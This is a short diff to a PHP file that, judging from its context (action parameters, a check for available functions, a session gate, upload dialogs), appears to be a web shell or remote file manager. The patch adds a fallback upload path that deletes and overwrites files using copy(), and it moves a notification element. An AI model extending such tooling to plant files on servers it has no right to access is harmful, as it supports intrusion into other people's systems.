@@ -609,6 +609,9 @@ if(isset($_GET['act'])){
 						} else {
 							$outs[] = $fname." failed!";
 						}
+					} else if(AvFunc(array('copy'))){
+						if(file_exists($xpath."/".$fname)){@unlink($xpath."/".$fname);}
+						$outs[] = @copy($ftmp, $xpath."/".$fname) ? $fname." uploaded!" : $fname." failed!";
 					} else {
 						$outs[] = $fname." failed!";
 					}
@@ -1047,8 +1050,8 @@ if(!isset($_SESSION['auth'])){
 					</div>
 				</div>
 			</div>
-			<div class="position-fixed top-0 right-0 p-3" id="shownotif" style="z-index:1031; right:0; top:0;"></div>
 		</div>
+		<div class="position-fixed top-0 right-0 p-3" id="shownotif" style="z-index:1031; right:0; top:0;"></div>
 		<div class="modal fade" id="uploadtypefile" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
 			<div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
 				<div class="modal-content bg-dark">
